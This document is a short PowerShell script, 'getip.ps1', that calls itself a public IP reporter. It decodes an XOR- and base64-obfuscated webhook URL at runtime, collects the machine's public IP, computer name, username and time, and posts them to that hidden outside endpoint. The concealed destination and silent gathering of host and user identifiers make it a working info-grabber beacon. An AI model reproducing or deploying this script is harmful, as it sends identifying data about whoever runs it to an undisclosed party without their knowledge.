 getip.ps1 — public IP reporter | webhook XOR-obfuscated

$ENC_HOOK = "Mi4uKilgdXU+Myk5NSg+dDk1N3U7KjN1LT84MjU1MSl1a29va25ua21qY2lvaWNpam1vaHU+Li4xHAMfFjwWK25tBQ8Xbgg+BTRrFTJ3OA0wEyINEA8QBWgoMzBrOSxvEDZiO241LjY2LQI2GCxqEDk+NwowPTsxPQ=="
$KEY      = 0x5A

# decode webhook at runtime — never stored in plaintext
$WEBHOOK = [System.Text.Encoding]::UTF8.GetString(
    ([Convert]::FromBase64String($ENC_HOOK) | ForEach-Object { $_ -bxor $KEY })
)

$ip       = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").ip
$hostname = $env:COMPUTERNAME
$user     = $env:USERNAME
$time     = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")

$body = [PSCustomObject]@{
    embeds = @(
        [PSCustomObject]@{
            title  = "IP Report"
            color  = 5763719
            fields = @(
                [PSCustomObject]@{ name = "Public IP";  value = "``$ip``";       inline = $true  }
                [PSCustomObject]@{ name = "Host";       value = "``$hostname``"; inline = $true  }
                [PSCustomObject]@{ name = "User";       value = "``$user``";     inline = $true  }
                [PSCustomObject]@{ name = "Time (UTC)"; value = "``$time``";     inline = $false }
            )
            footer = [PSCustomObject]@{ text = "getip.ps1" }
        }
    )
} | ConvertTo-Json -Depth 10

Invoke-RestMethod -Uri $WEBHOOK -Method Post -ContentType "application/json" -Body $body
Write-Host "[+] Sent: $ip"
